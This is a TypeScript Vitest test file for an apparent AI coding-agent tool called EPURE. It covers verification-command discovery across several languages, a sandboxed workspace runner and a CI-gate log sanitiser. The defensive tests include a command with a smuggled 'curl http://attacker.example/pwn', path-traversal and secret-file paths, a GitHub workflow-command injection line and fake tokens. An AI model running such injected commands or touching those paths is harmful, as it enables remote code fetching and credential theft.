import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  buildDefaultAgentsYaml,
  discoverVerificationProfile,
  parseAgentsYaml,
  planAndApplyRepoSetup,
  type VerificationProfile,
  type VerificationTargetSpec
} from "../src/bootstrap/setup-repo.js";
import {
  classifyCiFailure,
  discoverExpectedExternalWorkflows,
  sanitizeAndFormatFailedCheckLogs,
  waitForExternalCiChecks,
  type ExternalCheckRunRecord,
  type ExternalWorkflowRunRecord
} from "../src/execution/external-ci-gate.js";
import {
  formatAndCondenseStage1CommandOutput,
  formatVerificationToolingGuideMarkdown,
  runPolyglotStage1Verification,
  validateWorkspaceFileOperations
} from "../src/sandbox/polyglot-workspace-runner.js";

function withTempRepoDir<T>(
  files: Readonly<Record<string, string>>,
  fn: (repoRootDir: string) => Promise<T> | T
): Promise<T> {
  const dir = mkdtempSync(join(tmpdir(), "epure-polyglot-test-"));
  try {
    for (const [relPath, content] of Object.entries(files)) {
      const fullPath = join(dir, relPath);
      const parentIdx = fullPath.lastIndexOf("/");
      if (parentIdx > 0) {
        mkdirSync(fullPath.slice(0, parentIdx), { recursive: true });
      }
      writeFileSync(fullPath, content, "utf8");
    }
    return Promise.resolve(fn(dir)).finally(() => {
      rmSync(dir, { recursive: true, force: true });
    });
  } catch (err) {
    rmSync(dir, { recursive: true, force: true });
    throw err;
  }
}

describe("EPURE v1.4.0 — Polyglot Verification Discovery, Workspace Sandbox & External CI Gate (ADR-0028)", () => {
  describe("Seam 1: Verification Profile Discovery & .github/agents.yml Persistence", () => {
    it.each([
      {
        id: "discovers-node-monorepo-with-prisma-and-python-docs-scripts",
        files: {
          "frontend/package.json": JSON.stringify({
            name: "web-frontend",
            scripts: {
              typecheck: "tsc --noEmit",
              lint: "eslint .",
              test: "vitest run",
              build: "vite build"
            },
            devDependencies: { typescript: "^5.0.0", vitest: "^2.0.0" }
          }),
          "backend/package.json": JSON.stringify({
            name: "api-backend",
            scripts: {
              typecheck: "tsc --noEmit",
              lint: "eslint src",
              "test:unit": "vitest run tests/unit",
              test: "vitest run"
            },
            dependencies: { "@prisma/client": "^5.0.0" },
            devDependencies: { prisma: "^5.0.0", typescript: "^5.0.0" }
          }),
          "backend/prisma/schema.prisma":
            'datasource db {\n  provider = "postgresql"\n}\n',
          "scripts/spec-coverage.py": "print('spec coverage ok')\n",
          ".github/workflows/ci.yml": [
            "name: CI",
            "on: [push, pull_request]",
            "jobs:",
            "  backend-test:",
            "    runs-on: ubuntu-26.04",
            "    defaults:",
            "      run:",
            "        working-directory: backend",
            "    services:",
            "      postgres:",
            "        image: postgres:16",
            "    steps:",
            "      - run: npm ci",
            "      - run: npx prisma generate",
            "      - run: npm run typecheck",
            "      - run: npm run lint",
            "      - run: npm test"
          ].join("\n")
        },
        assertProfile: (profile: VerificationProfile) => {
          expect(profile.wait_for_external_ci).toBe(true);
          expect(profile.deferred_external_workflows).toEqual([
            ".github/workflows/ci.yml"
          ]);

          const frontend = profile.targets.find((t) => t.name === "frontend");
          expect(frontend).toBeDefined();
          expect(frontend?.kind).toBe("node");
          expect(frontend?.working_directory).toBe("frontend");
          expect(frontend?.typecheck_command).toBe("npm run typecheck");
          expect(frontend?.lint_command).toBe("npm run lint");
          expect(frontend?.test_command).toBe("npm test");

          const backend = profile.targets.find((t) => t.name === "backend");
          expect(backend).toBeDefined();
          expect(backend?.kind).toBe("node");
          expect(backend?.working_directory).toBe("backend");
          expect(backend?.codegen_command).toBe("npx prisma generate");
          expect(backend?.typecheck_command).toBe("npm run typecheck");
          expect(backend?.lint_command).toBe("npm run lint");
          // Stage 1 only keeps service-free unit tests when job declares services: postgres
          expect(backend?.test_command).toBe("npm run test:unit");

          const scripts = profile.targets.find((t) => t.name === "scripts");
          expect(scripts).toBeDefined();
          expect(scripts?.kind).toBe("custom");
          expect(scripts?.test_command).toBe("python3 scripts/spec-coverage.py");
        }
      },
      {
        id: "discovers-python-pyproject-with-ruff-mypy-pytest",
        files: {
          "pyproject.toml": [
            "[project]",
            'name = "astral-service"',
            'version = "0.1.0"',
            "[tool.ruff]",
            "line-length = 100",
            "[tool.mypy]",
            "strict = true",
            "[tool.pytest.ini_options]",
            'testpaths = ["tests"]'
          ].join("\n")
        },
        assertProfile: (profile: VerificationProfile) => {
          expect(profile.targets).toHaveLength(1);
          const root = profile.targets[0]!;
          expect(root.name).toBe("root");
          expect(root.kind).toBe("python");
          expect(root.working_directory).toBe(".");
          expect(root.install_command).toBe("pip install -e .");
          expect(root.typecheck_command).toBe("mypy .");
          expect(root.lint_command).toBe("ruff check .");
          expect(root.test_command).toBe("pytest -q");
        }
      },
      {
        id: "discovers-rust-cargo-workspace",
        files: {
          "Cargo.toml": [
            "[package]",
            'name = "enclume-core"',
            'version = "0.1.0"',
            'edition = "2021"'
          ].join("\n")
        },
        assertProfile: (profile: VerificationProfile) => {
          expect(profile.targets).toHaveLength(1);
          const root = profile.targets[0]!;
          expect(root.name).toBe("root");
          expect(root.kind).toBe("rust");
          expect(root.typecheck_command).toContain("cargo check");
          expect(root.lint_command).toContain("cargo clippy");
          expect(root.test_command).toContain("cargo test");
        }
      },
      {
        id: "discovers-go-module",
        files: {
          "go.mod": "module github.com/giskard-ai/epure-go-demo\n\ngo 1.24\n"
        },
        assertProfile: (profile: VerificationProfile) => {
          expect(profile.targets).toHaveLength(1);
          const root = profile.targets[0]!;
          expect(root.name).toBe("root");
          expect(root.kind).toBe("go");
          expect(root.typecheck_command).toBe("go vet ./...");
          expect(root.test_command).toBe("go test ./...");
        }
      },
      {
        id: "discovers-multi-workflow-repo-and-ignores-epure-workflows",
        files: {
          "package.json": JSON.stringify({
            name: "multi-wf-app",
            scripts: { lint: "eslint .", typecheck: "tsc --noEmit" }
          }),
          ".github/workflows/lint.yml": [
            "name: Lint & Typecheck",
            "on: [pull_request]",
            "jobs:",
            "  lint:",
            "    runs-on: ubuntu-26.04",
            "    steps:",
            "      - run: npm ci",
            "      - run: npm run lint",
            "      - run: npm run typecheck"
          ].join("\n"),
          ".github/workflows/backend-e2e.yml": [
            "name: Backend E2E",
            "on: [pull_request]",
            "jobs:",
            "  e2e:",
            "    runs-on: ubuntu-26.04",
            "    services:",
            "      postgres:",
            "        image: postgres:16",
            "    steps:",
            "      - run: npx playwright test"
          ].join("\n"),
          ".github/workflows/docs.yml": [
            "name: Docs Check",
            "on: [pull_request]",
            "jobs:",
            "  docs:",
            "    runs-on: ubuntu-26.04",
            "    steps:",
            "      - run: python3 scripts/spec-coverage.py"
          ].join("\n"),
          ".github/workflows/epure-issue-command.yml": [
            "name: EPURE Issue Command Gate",
            "on:",
            "  issue_comment:",
            "    types: [created]",
            "jobs:",
            "  orchestrate:",
            "    runs-on: ubuntu-26.04",
            "    steps:",
            "      - uses: Giskard-AI/epure/actions/orchestrate-issue@a1b2c3d4e5f60718293a4b5c6d7e8f9012345678",
            "      - run: cargo test --all-targets"
          ].join("\n")
        },
        assertProfile: (profile: VerificationProfile) => {
          // epure-issue-command.yml must be ignored (no rust/cargo target inferred)
          expect(profile.targets.some((t) => t.kind === "rust")).toBe(false);
          // backend-e2e.yml is deferred to Stage 3
          expect(profile.deferred_external_workflows).toEqual([
            ".github/workflows/backend-e2e.yml"
          ]);
          // lint.yml commands are extracted into root node target
          const root = profile.targets.find((t) => t.name === "root");
          expect(root?.install_command).toBe("npm ci");
          expect(root?.lint_command).toBe("npm run lint");
          expect(root?.typecheck_command).toBe("npm run typecheck");
          // docs.yml python script is extracted into scripts target
          const scripts = profile.targets.find((t) => t.name === "scripts");
          expect(scripts?.test_command).toBe("python3 scripts/spec-coverage.py");
        }
      }
    ])("$id", async ({ files, assertProfile }) => {
      await withTempRepoDir(files, (repoRootDir) => {
        const profile = discoverVerificationProfile({ repoRootDir });
        assertProfile(profile);
      });
    });

    it.each([
      {
        id: "round-trips-verification-profile-and-targets-in-agents-yaml",
        customTargets: [
          {
            name: "custom-api",
            working_directory: "backend",
            kind: "node" as const,
            path_patterns: ["backend/**", "shared/**"],
            install_command: "npm ci",
            codegen_command: "npx prisma generate",
            typecheck_command: "npm run typecheck",
            lint_command: "npm run lint",
            test_command: "npm run test:unit"
          }
        ],
        resetVerificationTargets: false,
        expectCustomPreserved: true
      },
      {
        id: "overwrites-custom-targets-when-reset-verification-targets-is-true",
        customTargets: [
          {
            name: "legacy-custom-target",
            working_directory: ".",
            kind: "custom" as const,
            path_patterns: ["legacy/**"],
            test_command: "python3 scripts/legacy.py"
          }
        ],
        resetVerificationTargets: true,
        expectCustomPreserved: false
      }
    ])(
      "$id",
      async ({
        customTargets,
        resetVerificationTargets,
        expectCustomPreserved
      }) => {
        const initialYaml = buildDefaultAgentsYaml({
          overrides: {
            verification: {
              wait_for_external_ci: true,
              external_ci_timeout_minutes: 20,
              grace_window_seconds: 60,
              deferred_external_workflows: [".github/workflows/ci.yml"],
              targets: customTargets
            }
          }
        });

        const parsed = parseAgentsYaml(initialYaml);
        expect(parsed.verification?.wait_for_external_ci).toBe(true);
        expect(parsed.verification?.external_ci_timeout_minutes).toBe(20);
        expect(parsed.verification?.grace_window_seconds).toBe(60);
        expect(parsed.verification?.deferred_external_workflows).toEqual([
          ".github/workflows/ci.yml"
        ]);
        expect(parsed.verification?.targets).toEqual(customTargets);

        await withTempRepoDir(
          {
            ".github/agents.yml": initialYaml,
            "pyproject.toml": '[project]\nname = "discovered-py"\n'
          },
          (repoRootDir) => {
            const setupRes = planAndApplyRepoSetup({
              repository: "Giskard-AI/demo-polyglot",
              repoRootDir,
              dryRun: true,
              agentsOverrides: {
                reset_verification_targets: resetVerificationTargets
              }
            });

            const targetNames =
              setupRes.agents_config.verification?.targets.map((t) => t.name) ??
              [];
            if (expectCustomPreserved) {
              expect(targetNames).toContain(customTargets[0]!.name);
            } else {
              expect(targetNames).not.toContain(customTargets[0]!.name);
              expect(targetNames).toContain("root");
            }

            expect(setupRes.summary_markdown).toContain(
              "#### Discovered Verification Targets (`verification.targets`)"
            );
            expect(setupRes.summary_markdown).toContain(
              "| Name | Kind | Working Directory | Path Patterns | Stage 1 Commands |"
            );
          }
        );
      }
    );
  });

  describe("Seam 2: Polyglot Workspace Runner (`src/sandbox/polyglot-workspace-runner.ts`)", () => {
    it.each([
      {
        id: "blocks-path-traversal-outside-workdir",
        files: ["../outside.txt", ".git/hooks/post-checkout"],
        isTaskBranch: true,
        expectedAllowed: false,
        expectedTraversal: ["../outside.txt", ".git/hooks/post-checkout"],
        expectedSensitive: [] as string[]
      },
      {
        id: "blocks-sensitive-paths-on-task-branch-before-stage1",
        files: [
          ".github/agents.yml",
          ".github/workflows/ci.yml",
          ".cursor/agents/security-reviewer.md",
          ".env.production"
        ],
        isTaskBranch: true,
        expectedAllowed: false,
        expectedTraversal: [] as string[],
        expectedSensitive: [
          ".github/agents.yml",
          ".github/workflows/ci.yml",
          ".cursor/agents/security-reviewer.md",
          ".env.production"
        ]
      },
      {
        id: "allows-normal-source-paths-on-task-branch",
        files: ["frontend/src/App.tsx", "backend/src/index.ts"],
        isTaskBranch: true,
        expectedAllowed: true,
        expectedTraversal: [] as string[],
        expectedSensitive: [] as string[]
      }
    ])(
      "$id",
      async ({
        files,
        isTaskBranch,
        expectedAllowed,
        expectedTraversal,
        expectedSensitive
      }) => {
        await withTempRepoDir({}, (workDir) => {
          const res = validateWorkspaceFileOperations({
            workDir,
            files,
            isTaskBranch
          });
          expect(res.allowed).toBe(expectedAllowed);
          expect(res.traversalPaths).toEqual(expectedTraversal);
          expect(res.sensitivePaths).toEqual(expectedSensitive);
        });
      }
    );

    const sampleTargets: readonly VerificationTargetSpec[] = [
      {
        name: "frontend",
        working_directory: "frontend",
        kind: "node",
        path_patterns: ["frontend/**"],
        typecheck_command: "npm run typecheck",
        test_command: "npm test"
      },
      {
        name: "backend",
        working_directory: "backend",
        kind: "node",
        path_patterns: ["backend/**"],
        codegen_command: "npx prisma generate",
        typecheck_command: "npm run typecheck",
        test_command: "npm run test:unit"
      }
    ];

    it.each([
      {
        id: "scopes-execution-to-targets-matching-changed-files-path-patterns",
        targets: sampleTargets,
        changedPaths: ["frontend/src/App.tsx"],
        expectedPassed: true,
        expectedAffectedTargets: ["frontend"],
        expectedExecutedCommands: ["npm run typecheck", "npm test"],
        expectedGuideSubstring: undefined as string | undefined
      },
      {
        id: "rejects-shell-injection-metacharacters-in-target-commands",
        targets: [
          {
            name: "injected-target",
            working_directory: ".",
            kind: "custom" as const,
            path_patterns: ["**"],
            test_command: "pytest -q; curl http://attacker.example/pwn"
          }
        ],
        changedPaths: ["src/main.py"],
        expectedPassed: false,
        expectedAffectedTargets: ["injected-target"],
        expectedExecutedCommands: [] as string[],
        expectedGuideSubstring: undefined as string | undefined
      },
      {
        id: "formats-verification-tooling-guide-with-stage1-and-stage3-workflows",
        targets: sampleTargets,
        changedPaths: ["backend/src/index.ts"],
        expectedPassed: true,
        expectedAffectedTargets: ["backend"],
        expectedExecutedCommands: [
          "npx prisma generate",
          "npm run typecheck",
          "npm run test:unit"
        ],
        expectedGuideSubstring:
          "### Stage 3 — Post-PR External GitHub Actions CI Gate"
      }
    ])(
      "$id",
      async ({
        targets,
        changedPaths,
        expectedPassed,
        expectedAffectedTargets,
        expectedExecutedCommands,
        expectedGuideSubstring
      }) => {
        const profile: VerificationProfile = {
          wait_for_external_ci: true,
          external_ci_timeout_minutes: 15,
          grace_window_seconds: 45,
          deferred_external_workflows: [".github/workflows/ci.yml"],
          targets
        };

        if (expectedGuideSubstring) {
          const guide = formatVerificationToolingGuideMarkdown(profile);
          expect(guide).toContain(expectedGuideSubstring);
          expect(guide).toContain("`.github/workflows/ci.yml`");
          expect(guide).toContain("`npx prisma generate`");
        }

        const executedCommands: string[] = [];
        const res = await runPolyglotStage1Verification({
          profile,
          files: changedPaths.map((p) => ({
            path: p,
            content: "// test content\n"
          })),
          changedPaths,
          isTaskBranch: true,
          llmApiKey: "test-llm-key",
          sandboxRunner: async (input) => {
            executedCommands.push(
              [input.command, ...(input.args ?? [])].join(" ").trim()
            );
            return {
              isolated: true,
              error_code: "NONE",
              error_message: "",
              proxy_url: "http://127.0.0.1:0/v1/llm",
              exit_code: 0,
              stdout: "ok",
              stderr: "",
              duration_ms: 5,
              sanitized_env: {}
            };
          }
        });

        expect(res.passed).toBe(expectedPassed);
        expect(res.affected_targets).toEqual(expectedAffectedTargets);
        expect(executedCommands).toEqual(expectedExecutedCommands);
      }
    );

    it.each([
      {
        id: "enforces-https-only-for-install-and-offline-for-codegen-typecheck-lint-test",
        target: {
          name: "api",
          working_directory: ".",
          kind: "node" as const,
          path_patterns: ["**"],
          install_command: "npm ci",
          codegen_command: "npx prisma generate",
          typecheck_command: "npm run typecheck",
          lint_command: "npm run lint",
          test_command: "npm test"
        },
        expectedStepPolicies: [
          { command: "npm ci", policy: "https_only" },
          { command: "npx prisma generate", policy: "offline" },
          { command: "npm run typecheck", policy: "offline" },
          { command: "npm run lint", policy: "offline" },
          { command: "npm test", policy: "offline" }
        ]
      }
    ])("$id", async ({ target, expectedStepPolicies }) => {
      const observedPolicies: Array<{ command: string; policy: string | undefined }> = [];
      const res = await runPolyglotStage1Verification({
        profile: {
          wait_for_external_ci: true,
          external_ci_timeout_minutes: 15,
          grace_window_seconds: 45,
          targets: [target]
        },
        files: [{ path: "src/index.ts", content: "export const x = 1;\n" }],
        changedPaths: ["src/index.ts"],
        isTaskBranch: true,
        llmApiKey: "test-llm-key",
        sandboxRunner: async (input) => {
          observedPolicies.push({
            command: [input.command, ...(input.args ?? [])].join(" ").trim(),
            policy: input.networkPolicy
          });
          return {
            isolated: true,
            error_code: "NONE",
            error_message: "",
            proxy_url: "http://127.0.0.1:0/v1/llm",
            exit_code: 0,
            stdout: "PASS",
            stderr: "",
            duration_ms: 5
          };
        }
      });

      expect(res.passed).toBe(true);
      expect(observedPolicies).toEqual(expectedStepPolicies);
    });

    it.each([
      {
        id: "strips-ansi-and-filters-lockfile-and-npm-noise-on-passing-command",
        exitCode: 0,
        stdout: [
          "\x1b[32mnpm warn deprecated inflight@1.0.6\x1b[0m",
          "npm notice created a lockfile as package-lock.json",
          "added 412 packages, and audited 413 packages in 3s",
          "found 0 vulnerabilities",
          "\x1b[32m✓ tests/math.test.ts (4 tests)\x1b[0m"
        ].join("\n"),
        stderr: "",
        expectedContains: ["✓ tests/math.test.ts (4 tests)"],
        expectedNotContains: [
          "\x1b[32m",
          "npm warn deprecated",
          "added 412 packages"
        ]
      },
      {
        id: "appends-stateless-in-memory-raw-failure-tail-when-command-fails-with-filtered-noise",
        exitCode: 1,
        stdout: [
          "npm warn deprecated glob@7.2.3",
          "Scanning node_modules/vitest/dist/vendor.min.js",
          "\x1b[31mFAIL tests/auth.test.ts > rejects expired JWT\x1b[0m"
        ].join("\n"),
        stderr:
          "AssertionError: expected 200 to deeply equal 401\n    at src/auth.ts:88:15",
        expectedContains: [
          "FAIL tests/auth.test.ts > rejects expired JWT",
          "AssertionError: expected 200 to deeply equal 401",
          "at src/auth.ts:88:15",
          "raw failure tail"
        ],
        expectedNotContains: ["\x1b[31m"]
      }
    ])(
      "formatAndCondenseStage1CommandOutput [$id]: formats logs statelessly without SQLite recall",
      ({
        exitCode,
        stdout,
        stderr,
        expectedContains,
        expectedNotContains
      }) => {
        const formatted = formatAndCondenseStage1CommandOutput({
          step: "test",
          rawCommand: "npm test",
          exitCode,
          stdout,
          stderr
        });

        for (const fragment of expectedContains) {
          expect(formatted).toContain(fragment);
        }
        for (const forbidden of expectedNotContains) {
          expect(formatted).not.toContain(forbidden);
        }
      }
    );
  });

  describe("Seam 3: Post-PR External CI Gate (`src/execution/external-ci-gate.ts`)", () => {
    it.each([
      {
        id: "matches-workflow-when-changed-paths-match-paths-filter-and-ignores-epure-workflows",
        changedPaths: ["backend/src/server.ts"],
        expectedWorkflowFiles: ["backend-ci.yml", "full-suite.yml"]
      },
      {
        id: "skips-workflow-when-changed-paths-are-excluded-by-paths-ignore",
        changedPaths: ["docs/architecture.md"],
        expectedWorkflowFiles: [] as string[]
      },
      {
        id: "matches-frontend-workflow-only-when-frontend-files-change",
        changedPaths: ["frontend/src/App.tsx"],
        expectedWorkflowFiles: ["frontend-ci.yml", "full-suite.yml"]
      }
    ])("$id", ({ changedPaths, expectedWorkflowFiles }) => {
      const workflowFilesMap = {
        ".github/workflows/epure-issue-command.yml": [
          "name: EPURE Issue Command Gate",
          "on: [pull_request]",
          "jobs:",
          "  gate:",
          "    runs-on: ubuntu-26.04"
        ].join("\n"),
        ".github/workflows/backend-ci.yml": [
          "name: Backend CI",
          "on:",
          "  pull_request:",
          "    paths:",
          "      - 'backend/**'",
          "jobs:",
          "  test:",
          "    runs-on: ubuntu-26.04"
        ].join("\n"),
        ".github/workflows/frontend-ci.yml": [
          "name: Frontend CI",
          "on:",
          "  pull_request:",
          "    paths: ['frontend/**']",
          "jobs:",
          "  test:",
          "    runs-on: ubuntu-26.04"
        ].join("\n"),
        ".github/workflows/full-suite.yml": [
          "name: Full Suite",
          "on:",
          "  pull_request:",
          "    paths-ignore:",
          "      - 'docs/**'",
          "      - '*.md'",
          "jobs:",
          "  e2e:",
          "    runs-on: ubuntu-26.04",
          "    services:",
          "      postgres:",
          "        image: postgres:16"
        ].join("\n")
      };

      const discovered = discoverExpectedExternalWorkflows({
        workflowFilesMap,
        changedPaths,
        targetBranch: "feature/42-demo"
      });

      expect(discovered.map((w) => w.fileName)).toEqual(expectedWorkflowFiles);
    });

    it.each([
      {
        id: "classifies-network-timeout-as-transient-infra-when-zero-reruns-used",
        rawLog:
          "npm ERR! network request failed: ETIMEDOUT connecting to registry.npmjs.org",
        infraRerunsUsedForSha: 0,
        expectedClassification: "transient_infra",
        expectedShouldRerun: true
      },
      {
        id: "classifies-transient-infra-as-code-failure-once-1-rerun-was-already-used-for-sha",
        rawLog: "503 Service Unavailable — Runner.Worker lost communication",
        infraRerunsUsedForSha: 1,
        expectedClassification: "code_or_test_failure",
        expectedShouldRerun: false
      },
      {
        id: "classifies-test-assertion-or-ts-compiler-error-as-code-or-test-failure",
        rawLog:
          "FAIL tests/forge.test.ts\nAssertionError: expected 42 to equal 100\nsrc/forge.ts(12,5): error TS2322: Type 'string' is not assignable to type 'number'.",
        infraRerunsUsedForSha: 0,
        expectedClassification: "code_or_test_failure",
        expectedShouldRerun: false
      }
    ])(
      "$id",
      ({
        rawLog,
        infraRerunsUsedForSha,
        expectedClassification,
        expectedShouldRerun
      }) => {
        const res = classifyCiFailure({
          conclusion: "failure",
          checkName: "Backend CI",
          rawLog,
          headSha: "deadbeef1234567890",
          infraRerunsUsedForSha
        });
        expect(res.classification).toBe(expectedClassification);
        expect(res.shouldRerunWorkflow).toBe(expectedShouldRerun);
      }
    );

    it.each([
      {
        id: "strips-ansi-neutralizes-workflow-commands-redacts-secrets-and-wraps-in-untrusted-test-output",
        rawLog: [
          "2026-10-26T10:15:00.123Z \x1b[31mFAIL src/forge.test.ts\x1b[0m",
          "::set-env name=EVIL::pwned",
          "::error file=src/forge.ts,line=10::TS2322 type mismatch",
          "Gemini key leaked: AIzaSyD-9876543210abcdefghijklmnopqrstu",
          "Header: Authorization: Bearer ghs_secretTokenValue1234567890"
        ].join("\n"),
        expectedNeutralizedCount: 2
      }
    ])("$id", ({ rawLog, expectedNeutralizedCount }) => {
      const sanitized = sanitizeAndFormatFailedCheckLogs({
        checkName: "Quality & Unit Tests",
        htmlUrl: "https://github.com/Giskard-AI/epure/runs/100",
        rawLog,
        annotations: [
          {
            path: "src/forge.ts",
            start_line: 10,
            title: "TypeScript Error",
            message: "TS2322: Type 'string' is not assignable to type 'number'"
          }
        ]
      });

      expect(sanitized.neutralizedWorkflowCommands).toBe(
        expectedNeutralizedCount
      );
      expect(sanitized.sanitizedExcerpt).not.toContain("\x1b[31m");
      expect(sanitized.sanitizedExcerpt).not.toContain("::set-env");
      expect(sanitized.sanitizedExcerpt).not.toContain("::error");
      expect(sanitized.sanitizedExcerpt).toContain(":[set-env]");
      expect(sanitized.sanitizedExcerpt).toContain(":[error]");
      expect(sanitized.sanitizedExcerpt).not.toContain(
        "AIzaSyD-9876543210abcdefghijklmnopqrstu"
      );
      expect(sanitized.sanitizedExcerpt).not.toContain(
        "ghs_secretTokenValue1234567890"
      );
      expect(sanitized.wrappedUntrustedOutput).toContain(
        "<untrusted_test_output>"
      );
      expect(sanitized.wrappedUntrustedOutput).toContain(
        "</untrusted_test_output>"
      );
    });

    it.each([
      {
        id: "fails-closed-after-45s-grace-window-when-expected-workflows-never-register",
        scenario: "grace_timeout" as const,
        expectedPassed: false,
        expectedReason: "grace_window_timeout",
        expectedInfraReruns: 0
      },
      {
        id: "polls-across-multiple-workflows-until-all-complete-and-succeed",
        scenario: "multi_workflow_poll" as const,
        expectedPassed: true,
        expectedReason: "all_passed",
        expectedInfraReruns: 0
      },
      {
        id: "triggers-1-automatic-infra-rerun-on-transient-failure-before-succeeding",
        scenario: "transient_infra_rerun" as const,
        expectedPassed: true,
        expectedReason: "all_passed",
        expectedInfraReruns: 1
      }
    ])(
      "$id",
      async ({
        scenario,
        expectedPassed,
        expectedReason,
        expectedInfraReruns
      }) => {
        let pollCall = 0;
        const rerunIds: number[] = [];

        const result = await waitForExternalCiChecks({
          headSha: "abcdef1234567890",
          expectedWorkflows: [".github/workflows/ci.yml"],
          graceWindowSeconds: 45,
          pollIntervalMs: 15_000,
          sleepFn: async () => {},
          listWorkflowRunsForSha: async (): Promise<
            readonly ExternalWorkflowRunRecord[]
          > => {
            pollCall += 1;
            if (scenario === "grace_timeout") {
              return [];
            }
            if (scenario === "multi_workflow_poll") {
              if (pollCall === 1) {
                return [
                  {
                    id: 1,
                    name: "Lint",
                    status: "completed",
                    conclusion: "success"
                  },
                  {
                    id: 2,
                    name: "Backend E2E",
                    status: "in_progress",
                    conclusion: null
                  }
                ];
              }
              return [
                {
                  id: 1,
                  name: "Lint",
                  status: "completed",
                  conclusion: "success"
                },
                {
                  id: 2,
                  name: "Backend E2E",
                  status: "completed",
                  conclusion: "success"
                }
              ];
            }
            // transient_infra_rerun
            if (pollCall === 1) {
              return [
                {
                  id: 77,
                  name: "CI",
                  status: "completed",
                  conclusion: "failure"
                }
              ];
            }
            return [
              {
                id: 77,
                name: "CI",
                status: "completed",
                conclusion: "success"
              }
            ];
          },
          listCheckRunsForRef: async (): Promise<
            readonly ExternalCheckRunRecord[]
          > => {
            if (scenario === "grace_timeout") {
              return [];
            }
            if (scenario === "multi_workflow_poll") {
              if (pollCall <= 1) {
                return [
                  {
                    id: 10,
                    name: "Lint",
                    status: "completed",
                    conclusion: "success"
                  },
                  {
                    id: 20,
                    name: "Backend E2E",
                    status: "in_progress",
                    conclusion: null
                  }
                ];
              }
              return [
                {
                  id: 10,
                  name: "Lint",
                  status: "completed",
                  conclusion: "success"
                },
                {
                  id: 20,
                  name: "Backend E2E",
                  status: "completed",
                  conclusion: "success"
                }
              ];
            }
            // transient_infra_rerun
            if (pollCall <= 1) {
              return [
                {
                  id: 700,
                  name: "CI / Integration",
                  status: "completed",
                  conclusion: "failure"
                }
              ];
            }
            return [
              {
                id: 700,
                name: "CI / Integration",
                status: "completed",
                conclusion: "success"
              }
            ];
          },
          getJobLogs: async () =>
            "ETIMEDOUT: failed to fetch package from registry",
          rerunFailedJobs: async (runId) => {
            rerunIds.push(runId);
          }
        });

        expect(result.passed).toBe(expectedPassed);
        expect(result.reason).toBe(expectedReason);
        expect(result.infraRerunsTriggered).toBe(expectedInfraReruns);
        if (scenario === "transient_infra_rerun") {
          expect(rerunIds).toEqual([77]);
        }
      }
    );
  });
});
